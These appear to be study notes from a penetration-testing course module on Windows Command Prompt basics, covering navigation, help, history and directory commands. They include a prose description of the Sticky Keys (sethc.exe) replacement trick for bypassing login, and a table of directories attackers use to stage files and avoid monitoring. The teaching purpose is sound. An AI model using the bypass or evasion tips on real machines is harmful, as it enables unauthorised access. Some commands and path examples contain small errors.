# Introduction

> The built-in Command Shell CMD.exe and PowerShell are two implementations included in all Windows hosts.

These tools provide:

- Direct access to the OS
- Automate routine tasks
- Provide user with granular control of any aspect of the computer and applications

> From a penetration testing perspective, we will learn how to utilize built-in Windows tools and commands and third-party scripts and applications to help with ***reconnaissance, exploitation and exfiltration of data*** from within a Windows environment as we move into the more advanced modules within HTB Academy.
### Command Prompt vs. PowerShell

> There are some differences between Windows Command Prompt and PowerShell, which we will wee throughout this module. 

One key difference is that you can run Command Prompt commands from a PowerShell module, but to run PowerShell commands from a Command Prompt, you would have to preface the command with `powershell` (i.e. `powershell get-alias`).

The following table outlines some other key differences.

| PowerShell                                                                 | Command Prompt                                        |
| -------------------------------------------------------------------------- | ----------------------------------------------------- |
| Introduced in 2006                                                         | Introduced in 1981                                    |
| Can run both batch commands and PowerShell cmdlets                         | Can run only batch commands                           |
| Supports the use of command aliases                                        | Does not support command aliases                      |
| Cmdlet output can be passed to other cmdlets                               | Command output cannot be passed to other commands     |
| All output is in the form of an object                                     | Output of commands in text                            |
| Able to execute a sequence of cmdlets in a script                          | A command must finish before the next command can run |
| Has an **Integrated Scripting Environment**                                | Does not have an ISE                                  |
| Can access programming libraries because it is built on the .NET framework | Cannot access these libraries                         |
| Can be run on Linux systems                                                | Can only be run on Windows systems                    |
> As we can see, the Command Prompt is a much more static way of interacting with the operating system, while PowerShell is a powerful scripting language that can be used for a wide variety of tasks and to create simple and very complex scripts.
### Scenario

We will use a scenario through this module to help keep the topics in scope and provide insight into how these tools and commands can aid our mission.

Consider this scenario:

> We are a system administrator looking to broaden our horizons and dip our toes into pentesting. Before we approach our manager and Internal Red Team to see about apprenticing, we must first practice and gain a fundamental understanding of Windows primary command line interfaces: `PowerShell` and `Command Prompt`. Soon they will have no choice by to accept us as a certified `Command Line Ninja` and grant us a seat at the table.
# Command Prompt Basics

> The first step down the rabbit hole to developing our command-line kung fu is to dive into `cmd.exe` (the Command Prompt application). Let's begin our white-belt level training by going over what cmd.exe is, how to access it, and how the shell works.
### CMD.exe

> The command prompt, also known as [cmd.exe](https://https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) or CMD, is the default command line interpreter for the Windows Operating System.

Originally based on the [COMMAND.COM](https://www.techopedia.com/definition/1360/commandcom) interpreter in DOS, the Command Prompt is ubiquitous across nearly all Windows operating systems. It allows users to input commands that are directly interpreted and then executed by the operating system. 

A single command can accomplish tasks such as changing a user's password or checking the status of network interfaces. 

- This also reduces system resources, as graphical-based programs require more CPU and memory.

While often overshadowed by its sleek counterpart [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2), knowledge of cmd.exe and its commands continue to pay dividends even in modern times.

**`Quick Story:`** Several times during a pentest, I have run into hosts that had PowerShell locked down pretty well or made completely inaccessible through application control such as AppLocker. Using the Command Prompt, I could still leverage the host to acquire further access and elevate my privileges to continue the assessment. Modern operating systems have plenty of legacy software still embedded within the hosts. As admins and assessors alike, we must be aware of this and understand how to use them to our advantage.
### Accessing CMD

> Before we can dig deeper into the basic usage of Command Prompt, we have one fundamental question to answer first and foremost:

`How do we access the Command Prompt?`

There are multiple ways to access the Command Prompt on a Windows system. How you wish to access the prompt is up to personal preference as well as meeting specific criteria depending on the resources that are available at the time. Before explaining those criteria, there are some essential concepts to explain first.
#### Local Access vs. Remote Access

**Scenario:** We are the system administrator at our company. As part of our daily duties and expectations, we must access machines from within our company's main headquarters and a branch office located in a different region to perform general maintenance and resolve technical issues. Let's say a user is having an issue with their machine, and you are called in to assist them. `How do we best access their machine to most effectively resolve their issue?`

> Several scenarios here are possible depending on the questions we ask ourselves. Is the user located in the same region as us? Is the user in the same building? Is the user's office within reasonable walking distance? Is the user actively connected and working on their machine?

- These questions will generally factor into our decision making from a SysAdmin's point of view regarding how we will attempt to access the machine in question. 
- However, we are getting slightly ahead of ourselves, so let's describe what accessing a machine entails and the available access types.

> Generally speaking, computer access can be categorized into two main categories:
#### Local Access

> Local access is synonymous with having ***Direct Physical Access*** (or virtual in the instance of a Virtual Machine (VM)) to the machine itself.

This level of access does not require the machine to be connected to a network, as it can be accessed directly through the peripherals (monitor, mouse, keyboard, etc.) connected to the machine. 

From the desktop, we can open up command prompt by:

- Using the Windows key + `r` to bring up the run prompt, and then typing in `cmd`. OR
- Accessing the executable from the drive path `C:\Windows\System32\cmd.exe`.
#### Remote Access

> On the other hand, remote access is the equivalent of accessing the machine using virtual peripherals over the network. This level of access does not require direct physical access to the machine, but requires it to be connected to the same network or have a route to the machine they intend to access remotely.

We can do this through the use of `telnet` (insecure, not recommended), `Secure Shell` (SSH), `PsExec`, `WinRM`, `RDP` or other protocols as needed. 

For a SysAdmin, remote management and access are a boon to our workflow. 

- We would not have to go to the user's desk and physically access the host to perform our duties. 
- This convenience for sysadmins can also implant a security threat into our network. 

> If our remote access tools are not configured correctly, or a threat gains access to valid credentials, an attacker can now have wide-ranging access to our environments. 
> 
> 	We must maintain the proper balance of availability and integrity of our networks for a proper security posture.
### Basic Usage

Looking at the Command Prompt, what we see now is similar to what it was decades ago. Moreover, navigation of the Command Prompt has remained mostly unchanged as well. 

Navigating through the file system is like walking down a hallway filled with doors. As we move into one hallway(`directory`), we can look to see what is there (using the `dir` command), then either issue additional commands or keep moving. Below, we will cover the basic shell layout, how to walk the halls, and how to acquire a map to get the lay of the land.
#### Using the `dir` Command

```cmd
C:\Users\htb\Desktop> dir
  
 Volume in drive C has no label.
 Volume Serial Number is DAE9-5896

 Directory of C:\Users\htb\Desktop

06/11/2021  11:59 PM    <DIR>          .
06/11/2021  11:59 PM    <DIR>          ..
06/11/2021  11:57 PM                 0 file1.txt
06/11/2021  11:57 PM                 0 file2.txt
06/11/2021  11:57 PM                 0 file3.txt
04/13/2021  11:24 AM             2,391 Microsoft Teams.lnk
06/11/2021  11:57 PM                 0 super-secret-sauce.txt
06/11/2021  11:59 PM                 0 write-secrets.ps1
               6 File(s)          2,391 bytes
               2 Dir(s)  35,102,117,888 bytes free
```

1. The current path location (`C:\Users\Desktop`)
2. The command we have issued (`dir`)
3. The results of the command (`output below the line the command was issued on`)

> When looking at the Command Prompt, it is a basic request-response type conversation. We requested a directory listing of the current working directory, and the system responded with the appropriate output.
#### Case Study: Windows Recovery

> In the event of a user lockout or some technical issue preventing us from regular use of the machine, booting from a Windows installation disc gives us the option to boot to `Repair Mode`.

From here, the user is provided access to a Command Prompt, allowing for command-line-based troubleshooting of the device.

While useful, this also poses a potential risk. For example, on this Windows 7 machine, we can use the recovery Command Prompt to tamper with the filesystem. Specifically, replacing the `Sticky Keys (sethc.exe)` binary with another copy of `cmd.exe`.

>Once the machine is rebooted, we can press `Shift` five times on the Windows login screen to invoke `Sticky Keys`. 
>
>Since the executable has been overwritten, what we get instead is another Command Prompt - this time with `NT AUTHORITY\SYSTEM` permissions. 
>
>We have bypassed any authentication and now have access to the machine as the super user.
# Getting Help

> The command prompt has a built-in `help` function that can provide us with detailed information about the available commands on our system and how to utilize those functions. 

In this section, we are going to cover the following in greater detail:

- How do we utilize the help functionality within Command Prompt?
- Why utilizing the help functionality is essential
- Where can we find additional external resources for help?
- How to utilize additional tips and tricks in the command prompt?
### How to Get Help

> When first looking at the Command Prompt interface, it can be overwhelming to stare at a blank prompt. Some initial questions might emerge, such as:

- What commands do I have access to?
- How do I use these commands?

Let's work on answering the initial question first. While utilizing the Command Prompt, finding help is as easy as typing `help`. Without any additional parameters, this command provides a list of built-in commands and basic information about each displayed command's usage. Let's take a look at it below.
#### Default Help Usage

```cmd
C:\htb> help

For more information on a specific command, type HELP command-name
ASSOC          Displays or modifies file extension associations.
ATTRIB         Displays or changes file attributes.
BREAK          Sets or clears extended CTRL+C checking.
BCDEDIT        Sets properties in boot database to control boot loading.
CACLS          Displays or modifies access control lists (ACLs) of files.
CALL           Calls one batch program from another.
CD             Displays the name of or changes the current directory.
CHCP           Displays or sets the active code page number.
CHDIR          Displays the name of or changes the current directory.
CHKDSK         Checks a disk and displays a status report.

<snip>
```

> From this output, we can see that it prints out a list of system commands (`built-ins`) and provides a basic description of its functionality. 

This is important because we can quickly find and efficiently parse the list of built in functions provided by the command prompt to find the function that suits our needs.  

- From here, we can transition to answering the second question on how these commands are used. 

> To print out detailed information about a particular command, we can issue the following: `help <command name>`.

```cmd
C:\htb> help time

Displays or sets the system time.

TIME [/T | time]

Type TIME with no parameters to display the current time setting and a prompt
for a new one. Press ENTER to keep the same time.

If Command Extensions are enabled, the TIME command supports
the /T switch which tells the command to just output the
current time, without prompting for a new time.
```

As we can see from the output above, when we issued the command `help time`, it printed the help details for time. 

This will work for any system command built-in but not for every command accessible on the system. Certain commands do not have a help page associated with them. 

- However, they will redirect you to running the proper command to retrieve the desired information. For example, running `help ipconfig` will give us the following output.
#### Detailed Output

```cmd
C:\htb> help ipconfig

This command is not supported by the help utility. Try "ipconfig /?".
```

In the previous example, the help feature let us know that it could not provide more information as the help utility does not directly support it. However, utilizing the suggested command `ipconfig /?` will provide us with the information we need to utilize the command correctly. 

*Be aware that several commands use the `/?` modifier interchangeably with help.*
### Why Do We Need the Help Utility?

> Another fundamental concept here is the following:

`Why does the help utility exist, and what does it serve today when access to the internet is so prevalent?`

**Example:** Imagine that you are tasked to assist in an internal on-site engagement for your company `GreenHorn`. You are immediately dropped into a Command Prompt session on a machine from within the internal network and have been tasked with enumerating the system. As per the rules of engagement, you have been stripped of any devices on your person and told that the firewall is blocking all outbound network traffic. You begin your enumeration on the system but need help remembering the syntax for a specific command you have in mind. You realize that you cannot reach the Internet by any means. `Where can you find it?`

> Although this scenario might seem slightly exaggerated, there will be scenarios similar to this one as an attacker where our network access will be heavily limited, monitored, or strictly unavailable.

Sometimes, we do not have every command and all parameters and syntax memorized, we will still be expected to perform even under these limitations. 

In instances where we are expected to perform, we will need alternate ways to gather the information we need instead of relying on the internet as a quick fix for our problems. 

`Why does the help utility exist?`

> The `help` utility serves as an `offline` manual for `CMD` and `DOS` compatible Windows operating system commands. `Offline` refers to the fact that this utility can be used on a system without network access. For those familiar with the [Linux Fundamentals](https://academy.hackthebox.com/module/18/section/67) Module, this utility is very similar to the `Man` pages on `Linux` based systems. Now that we understand why the help utility exists, we can cover the second part of the original question:

`What use does it serve today when access to the internet is so prevalent?`

As shown in the **scenario**, there will be times when we may not have direct access to the internet. The `help` utility is meant to bridge the gap when we need assistance with commands or specific syntax for said commands on our system and may not have the external resources available to ask for help.

*This does not imply that the `Internet` is not a valuable tool to use in engagements. However, if we do not have the luxury of searching for answers to our questions, we need some way to retrieve said information.*
### Where Can You Find Additional Help?

In the previous section, we discussed the importance of utilizing the help system built into the Command Prompt, especially in an environment where external network traffic is non-existent or limited. However, assuming we have access to the Internet, there are dozens of `online resources` at our disposal for additional help regarding the Command Prompt. 

As stated before, the Internet is an extremely valuable tool and should be utilized to its fullest extent, especially if unrestricted access exists. 

To help enhance our understanding of CMD and alleviate some of the time sink involved with searching for material, here are a couple of `CMD.exe` command references where we can learn more about what can be done with our command shell.

> [Microsoft Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands) has a complete listing of the commands that can be issued within the command-line interpreter as well as detailed descriptions of how to use them. Think of it as an online version of the Man pages.

> [ss64](https://ss64.com/nt/) Is a handy quick reference for anything command-line related, including cmd, PowerShell, Bash, and more.
---
### Basic Tips and Tricks

#### Clear Your Screen

> We can use the command `cls` to clear our terminal window of our previous results. This comes in handy when we need to refresh our screen and want to avoid fighting to read the terminal and figuring out where our current output starts and the old input ends.
#### History

Previously, we expanded upon clearing the output from the Command Prompt session using `cls`. Although that information has been cleared from the screen's output, we can still retrieve the commands that were run up to that point. This is due to a nifty feature built into the Command Prompt known as `Command History`.

> `Command History` is a dynamic thing. It allows us to `view previously ran commands` in our Command Prompt's **`current active session`**. 

We can use the arrow keys to move up and down through our history, the `page up` and `page down` keys, and if working on a physical Windows host, you can use the `function` keys to interact with your session history.

The last way we can view our history is by utilizing the command `doskey /history`. [Doskey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/doskey) is an MS-DOS utility that keeps a history of commands issued and allows them to be referenced again.
#### doskey /history

```cmd
C:\htb> doskey /history

systeminfo
ipconfig /all
cls
ipconfig /all
systeminfo
cls
history
help
doskey /history
ping 8.8.8.8
doskey /history
```

> From the output provided above, we can view a list of `commands` that were run before our original command. 
> 
> This is important and incredibly useful, especially if you are constantly clearing your screen and need to rerun a previous command to collect its `output`. 

Interacting and viewing all previously run commands will have you extra time, energy and headache.
#### Useful Keys & Commands for Terminal History

> The table below shows a list of some of the most valuable functions and commands that can be run to interact with our session history. This list is not exhaustive. For example, the function keys F1 - F9 all serve a purpose when working with history.

| Key/Command     | Description                                                                                                                |
| --------------- | -------------------------------------------------------------------------------------------------------------------------- |
| doskey /history | doskey /history will print the sessions command history to the terminal or output it to a file when specified.             |
| page up         | Places the first command in our session history to the prompt.                                                             |
| page down       | Places the last command in history to the prompt.                                                                          |
| ⇧               | Allows us to scroll up through our command history to view previously run commands                                         |
| ⇩               | Allows us to scroll down to our most recent commands run.                                                                  |
| ⇨               | Types the previous command to prompt one character at a time.                                                              |
| ⇦               | N/A                                                                                                                        |
| F3              | Will retype the entire previous entry to our prompt.                                                                       |
| F5              | Pressing F5 multiple times will allow you to cycle through previous commands                                               |
| F7              | Opens an interactive list of previous commands                                                                             |
| F9              | Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history. |
> One thing to remember is that unlike Bash or other shells, CMD does not keep a persistent record of the commands you issue through sessions. 
> 
> So once you close that instance, that history is gone. To save a copy of our issued commands, we can use `doskey` again to output the history to a file, show it on screen, and then copy it.
#### Exit a Running Process

> At some point in our journey working with the `Command Prompt`, there will be times when we will need to be able to `interrupt` an actively running process, effectively killing it. 

This can be due to many different factors. However, a lot of the time, we might have the information that we need from a currently running command or find ourselves dealing with an application that's locking up unexpectedly. 

Thus, we need a way of interrupting our current session and any process running in it. 

```cmd
C:\htb> ping 8.8.8.8

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=22ms TTL=114
Reply from 8.8.8.8: bytes=32 time=25ms TTL=114

Ping statistics for 8.8.8.8:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 22ms, Maximum = 25ms, Average = 23ms
Control-C
^C
```

> When running a command or process we want to interrupt, we can do so by pressing the `ctrl+c` key combination.
# System Navigation

> So far, most of what we have covered is introductory information to help us get a basic understanding and feel of the Command Prompt.

Continuing with that flow, our next goal should be utilizing our Command Prompt to successfully `navigate` and move around on the system.

In this sectiom, we attempt to conquer our surroundings by:

- Listing a Directory
- Finding our place on the system
- Moving around using CD
- Exploring a file system

> Additionally, at the end of the section, we will briefly look into certain directories on a Windows host that might seem juicy from the adversary's perspective.
### Listing a Directory

One of the easiest things we can do when initially poking around on a Windows host is to get a listing of the directory we are currently working in. We do that with the `dir` command.

```cmd
C:\Users\htb\Desktop> dir
  
 Volume in drive C has no label.
 Volume Serial Number is DAE9-5896

 Directory of C:\Users\htb\Desktop

06/11/2021  11:59 PM    <DIR>          .
06/11/2021  11:59 PM    <DIR>          ..
06/11/2021  11:57 PM                 0 file1.txt
06/11/2021  11:57 PM                 0 file2.txt
06/11/2021  11:57 PM                 0 file3.txt
04/13/2021  11:24 AM             2,391 Microsoft Teams.lnk
06/11/2021  11:57 PM                 0 super-secret-sauce.txt
06/11/2021  11:59 PM                 0 write-secrets.ps1
               6 File(s)          2,391 bytes
               2 Dir(s)  35,102,117,888 bytes free
```

> As seen through the example above, `dir` is an easy-to-use and surprisingly versatile command. Simply calling upon the command without any arguments will give us a listing of our current directory and its contents.

As shown in the Getting Help section, we can also use the `/?` argument to provide us with a complete listing of the `dir`'s functionality and any additional arguments that we can provide to utilize it's advanced searching capabilities.
### Finding our Place

> Before doing anything on a host, it is helpful to know where we are in the filesystem. We can determine that by utilizing the `cd` or `chdir` commands.

```cmd
C:\htb> cd 

C:\htb  
```

> Issuing the `cd` command without arguments gives us our `current working directory`.
> 
> 	Our current working directory is our initial starting point. It describes our current directory as the one we are currently working in. 
> 	Any commands run here without specifying the path of another directory or file will reference this initial point.

This is very important, considering that everything we do going forward will reference our current working directory unless specified otherwise.
### Moving Around Using `CD/CHDIR`

> Besides listing our current directory, both serve an additional function.
> 
> 	These commands will move to whatever directory we specify after the command.

The specified directory can either be a directory relative to our current working directory or an absolute directory starting from the filesystem's root.

Those familiar with `Linux` should begin to recognize this structure and be familiar with the difference between `relative paths` and `absolute paths`.

- However, assuming that we have not come into contact with either of these terms yet, let us quickly showcase the difference using the following examples:
#### Current Working Directory

```cmd
C:\htb> cd 

C:\htb  
```

> This should look familiar, right? It is the same example used in the previous section. Let us expand upon this a bit. First, we need to define our `root` directory. 
> To keep things simple, think of the `root` directory as the topmost directory in the structure, as it contains everything else within it. In this example, our `root` directory is `C:\`.

**Note:** `C:\` is the root directory of all Windows machines and has been determined so since it is inception in the MS-DOS and Windows 3.0 days. The "C:\" designation was used commonly as typically "A:\" and "B:\" were recognized as floppy drives, whereas "C:\" was recognized as the first internal hard drive of the machine.
#### Absolute Path

```cmd
C:\htb> cd C:\Users\htb\Pictures

C:\Users\htb\Pictures> 
```

> In this example, we can see that our initial working directory is located in the `C:\htb`. We used `cd` and provided the path as our argument to move ourselves to the `C:\Users\htb\Pictures` directory. 
> 
> 	As we can see, the provided path starts with `C:\` as it is the root directory and follows the structure until it reaches its destination, being the `\Pictures` directory. 

Putting the pieces together, we can conclude that `C:\Users\htb\Pictures` would be considered the **`absolute path`** in this case as it follows the complete structure of the filesystem starting from the `root` directory and ending at the destination directory.
#### Relative Path

```cmd
C:\htb> cd .\Pictures

C:\Users\htb\Pictures> 
```

> On the other hand, following this example, we can see that something is slightly off in how our path is specified in the `cd` command. Instead of starting from the `root` directory, we are greeted with a `.` followed by the destination directory `\Pictures`. 
> 
> 	The `.` character points to one directory down from our current working directory (`C:\htb`). Using our working directory as the starting point to reference directories either above it or below it in the filesystem hierarchy is considered a **`relative path`**, as its position is relative to the current working directory.

Understanding both of these terms is imperative as we can effectively use this knowledge of the filesystem's hierarchy to move up and down the file structure with ease. We can piece everything together through one example to show how quickly we can use what we have learned to move about the system.

We are currently in the `C:\Users\htb\Pictures` directory provided in our previous example. However, we wish to quickly move all the way back to the root of the file system in just one command. To do so, we can perform the following:

```cmd
C:\Users\htb\Pictures>  cd ..\..\..\

C:\>
```

> This one command lets us move up the directory structure, starting from the `\Pictures` directory and moving up the `root` directory in one swift stroke. 
### Exploring the Filesystem

> Thorough exploration is essential, as it can help us gain a considerable advantage in understanding the layour of the system we are interacting with and the files contained within. However, when looking around the filesystem of a Windows host, it can get tedious to change our directory back and forth or to issue the `dir` command for each sub-directory.
> 
> 	To save us a bit of time and gain some efficiency, we can get a printout of the entire path we specify and its subdirectories by utilizing the `tree` command. 
#### Listing the Contents of the Filesystem

```cmd
C:\htb\student\> tree

Folder PATH listing
Volume serial number is 26E7-9EE4
C:.
├───3D Objects
├───Contacts
├───Desktop
├───Documents
├───Downloads
├───Favorites
│   └───Links
├───Links
├───Music
├───OneDrive
├───Pictures
│   ├───Camera Roll
│   └───Saved Pictures
├───Saved Games
├───Searches
└───Videos
    └───Captures
```

> From a hacker perspective, this can be super useful when searching for files and folders with juicy information we may want, like configurations, project files and folders, and maybe even the holy grail, a file or folder containing passwords.

We can use the `/F` parameter with the tree command to see a listing of each file and the directories along with the directory tree of the path.
#### Tree /F 

```cmd
C:\htb\student\> tree /F

Folder PATH listing
Volume serial number is 26E7-9EE4
C:.
├───3D Objects
├───Contacts
├───Desktop
│       passwords.txt.txt
│       Project plans.txt
│       secrets.txt
│
├───Documents
├───Downloads
├───Favorites
│   │   Bing.URL
│   │
│   └───Links
├───Links
│       Desktop.lnk
│       Downloads.lnk
│
├───Music
├───OneDrive
├───Pictures
│   ├───Camera Roll
│   └───Saved Pictures
├───Saved Games
├───Searches
│       winrt--{S-1-5-21-1588464669-3682530959-1994202445-1000}-.searchconnector-ms
│
└───Videos
    └───Captures

    <SNIP>
```

> From this example, we can quickly get a feel for the system and see some juicy files such as `passwords.txt.txt` and `secrets.txt`.

Of course, since this performs a complete listing of every single file and directory on a system, we must be aware of how much output this command will kick up.

Later in the module, we will learn a more manageable way of *handling the output* and working with other command line applications to *manipulate it into a much more desirable format.* 

For now, be aware that after attempting to run this command, we should probably interrupt its executing using `Ctrl+C` after receiving the desired information.
### Interesting Directories

> As promised, we have nearly reached the end of this section. With our current skill set, navigating the system should be much more approachable now that it initially seemed. 

Let us take a minute to discuss some directories that can come in handy from an attacker's perspective on a system. Below is a table of common directories that an *attacker can abuse to drop files to disk, perform reconnaissance, and help facilitate attack surface mapping on a target host.*

| Name:               | Location:                            | Description:                                                                                                                                                                                                                                                                    |
| ------------------- | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| &SYSTEMROOT%\Temp   | `C:\Windows\Temp`                    | Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write and execute permissions.                                                                                            |
| %TEMP%              | `C:\Users\<user>\AppData\Local\Temp` | Local directory containing a user's temporary file accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.                         |
| %PUBLIC%            | `C:\Users\Public`                    | Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc, files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity. |
| %ProgramFiles%      | `C:\Program Files`                   | Folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.                                                                                                                              |
| %ProgramFiles(x86)% | `C:\Program Files (x86)`             | Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.                                                                                                                              |
> The table above is by no means an all-encompassing list of all interesting directories on a Windows Host.
> 
> 	However, these will likely be targeted as they are useful to attackers. 
# Working with Directories and Files

> Now that we can safely navigate via the command line, it is time to master the art of files and directories.
> 
> 	This can be a robust topic; we have several ways to accomplish the same tasks with Windows. We will cover a few but keep in mind that there are many other ways to work with files and directories.
### Directories

> What is a directory?

In this case, it is an overarching folder structure within the Windows filesystem. Our files are nested within this folder structure, and we can move around utilizing common commands we practiced in the last section, such as `cd` and `dir`. 

Revisiting our hallway concept from the last section when thinking about directories, we can break it down like this:

- The Drive itself is a disk, but it is also the root directory. So think about the `C:` drive as our hotel.
- That hotel has many different floors filled with hallways. This level would include directories like `Windows, Users, Program Files` and any other directories created by the operating system or the users. 
- These floors have multiple halls. Think of each hall as a folder nested with our previous directories. So for the case of Users, we would then have a folder for each user logged into the host. 
	- At this point, we are several levels deep into the filesystem. (`C:\Users\htb`) as an example of a directory. 
- This continues with other hallways (directories) as the use of the host expands and more software is installed.
- Eventually, we find the room we were looking for and peek in. Think of the door as a file within the directory hive. 
### Viewing & Listing Directories

> As we said in the previous section, we can issue the `cd` command when trying to see what directory we currently reside in. 

To get a listing of what files are within a directory, we can use the `dir` command, and `tree` provides a complete listing of all files and folders within the specified path. 
### Create a New Directory

> Creating a directory to add to our structure is a simple endeavor. We can utilize the `md` and `mkdir` commands. 
#### Using MD

```cmd
C:\Users\htb\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  09:28 PM    <DIR>          .
06/15/2021  09:28 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  09:32 PM    <DIR>          Git-Pulls
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
               5 File(s)            353 bytes
               5 Dir(s)  38,644,342,784 bytes free

C:\Users\htb\Desktop>md new-directory

C:\Users\htb\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  10:26 PM    <DIR>          .
06/15/2021  10:26 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  09:32 PM    <DIR>          Git-Pulls
06/15/2021  10:26 PM    <DIR>          new-directory
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
               5 File(s)            353 bytes
               6 Dir(s)  38,644,277,248 bytes free
```

Above, `md` is in use. In the next shell, we will see `mkdir` used similarly. Both accomplish the same goal, so use either as you wish. 
#### Using `mkdir` to Create Directories

```cmd
C:\Users\htb\Desktop> mkdir yet-another-dir

C:\Users\htb\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  10:28 PM    <DIR>          .
06/15/2021  10:28 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  09:32 PM    <DIR>          Git-Pulls
06/15/2021  10:26 PM    <DIR>          new-directory
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
06/15/2021  10:28 PM    <DIR>          yet-another-dir
               5 File(s)            353 bytes
               7 Dir(s)  38,644,056,064 bytes free
```
### Delete Directories

> Deleting directories can be accomplished using the `rd` or `rdmir` commands. The commands `rd` and `rdmir` are explicitly meant for removing directory trees and do not deal with specific files or attributes.
### `RD` & `RMDIR`

```cmd
C:\Users\htb\Desktop> dir

 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  10:28 PM    <DIR>          .
06/15/2021  10:28 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  09:32 PM    <DIR>          Git-Pulls
06/15/2021  10:26 PM    <DIR>          new-directory
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
06/15/2021  10:28 PM    <DIR>          yet-another-dir
               5 File(s)            353 bytes
               7 Dir(s)  38,634,733,568 bytes free

C:\Users\htb\Desktop> rd Git-Pulls
The directory is not empty.
```
#### `RD /S`

```cmd
C:\Users\htb\Desktop> rd /S Git-Pulls
Git-Pulls, Are you sure (Y/N)? Y

C:\Users\htb\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/16/2021  01:32 PM    <DIR>          .
06/16/2021  01:32 PM    <DIR>          ..
06/14/2021  10:37 PM                19 file.txt
06/15/2021  10:26 PM    <DIR>          new-directory
06/14/2021  10:59 PM                26 normal-file.txt
06/15/2021  09:29 PM    <DIR>          Notes
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    <DIR>          Work-Policies
06/15/2021  10:28 PM    <DIR>          yet-another-dir
               5 File(s)            353 bytes
               6 Dir(s)  38,634,733,568 bytes free
```

> In the session above, we listed the directory to see it's contents, then issued the `rd Git-Pulls` command. From the session window, we can see that it did not execute the command since the directory was not empty. Rd has a switch `/S` that we can utilize to erase the directory and its contents.

Since we want to make Git-Pulls disappear, we will issue it in the second cmd session seen above. The commands we have issued with `rd` are the same as `rmdir`.

Removing directories is pretty simple. *If you get stuck trying to remove a directory and are getting a warning saying the directory is not empty, do not forget about the `/S` switch.*
### Modifying

> Modifying a directory is more complicated than changing a file. The directory holds data within it for other files or directories. We have several options in any case. `Move`, `Robocopy`, and `xcopy` can copy and make changes to directories and their structures.

To use `move`, we have to issue the syntax in this order. When moving directories, it will take the directory and any files within and move it from the `source` to the `destination` path specified.
#### Move a Directory

```cmd
C:\Users\htb\Desktop> tree example /F

Folder PATH listing
Volume serial number is 00000032 DAE9:5896
C:\USERS\HTB\DESKTOP\EXAMPLE
│   file-1 - Copy.txt
│   file-1.txt
│   file-2.txt
│   file-3.txt
│   file-5.txt
│   ‎file-4.txt
│
└───more stuff

C:\Users\htb\Desktop> move example C:\Users\htb\Documents\example

        1 dir(s) moved.
```

> We ran the tree command to see what resided in the example directory before copying it. After that, executing `move example C:\Users\htb\Documents\Example` placed the example directory and all its files into the users Documents folder. 

We can validate this by running a `dir` or Documents to see if the directory exists.
#### Validate the Move

```cmd
C:\Users\htb\Desktop> dir C:\Users\htb\Documents

Volume in drive C has no label.
 Volume Serial Number is DAE9-5896

 Directory of C:\Users\htb\Documents

06/17/2021  03:14 PM    <DIR>          .
06/17/2021  03:14 PM    <DIR>          ..
06/17/2021  02:23 PM    <DIR>          example
06/17/2021  02:01 PM    <DIR>          test
04/13/2021  12:21 PM    <DIR>          WindowsPowerShell
04/22/2021  01:11 PM           933,003 Wireshark-lab-2.pcap
               1 File(s)        933,003 bytes
               5 Dir(s)  36,644,110,336 bytes free
```

> The directory `example` now exists within the documents directory. The following two options have more capability in the ways they can interact with files and directories. We will take a minute to look at `xcopy` since it exists in current Windows operating systems, but it is essential to know that it has ***deprecated for `robocopy`***. 

Where `xcopy` shines is that it can remove the Read-only bit from files when moving them. 

